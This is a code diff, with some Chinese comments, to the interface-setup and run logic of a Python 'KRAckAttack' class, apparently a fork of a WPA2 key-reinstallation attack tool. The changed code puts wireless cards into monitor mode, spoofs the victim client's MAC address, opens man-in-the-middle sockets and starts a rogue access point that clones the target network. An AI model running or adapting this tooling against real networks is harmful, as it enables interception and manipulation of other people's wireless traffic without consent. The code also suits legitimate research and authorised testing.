@@ -551,24 +551,16 @@ class KRAckAttack():
 		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
 		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
-		# 1. Remove unused virtual interfaces
-		if self.nic_rogue_mon is None:
-			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-
-		# 2. Configure monitor mode on interfaces
+		# 1. Configure monitor mode on interfaces
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
-		if self.nic_rogue_mon is None:
-			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
-			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "managed"])
-			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
-			time.sleep(0.2)
+		time.sleep(0.2)
 
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 
-		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
+		#2. 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
 				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
 				call_macchanger(self.nic_real_clientack, self.clientmac)
@@ -578,7 +570,7 @@ class KRAckAttack():
 			# Sleep for a second to make this warning very explicit
 			time.sleep(1)
 
-		# 4. Finally put the interfaces up
+		# 3. Finally put the interfaces up
 		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 	
@@ -586,7 +578,7 @@ class KRAckAttack():
 	def run(self, strict_echo_test=False):
 		self.configure_interfaces()
 		
-		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
+		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
 		self.find_beacon(self.ssid)
@@ -611,15 +603,14 @@ class KRAckAttack():
 
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: 
+			subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
+			subprocess.check_output(["iwconfig", self.nic_real_clientack, "channel", str(self.netconfig.real_channel), "fixed"])
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
-			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
 		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
-		print('debug: ', end='')
-		print(hostapd_path)
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 		
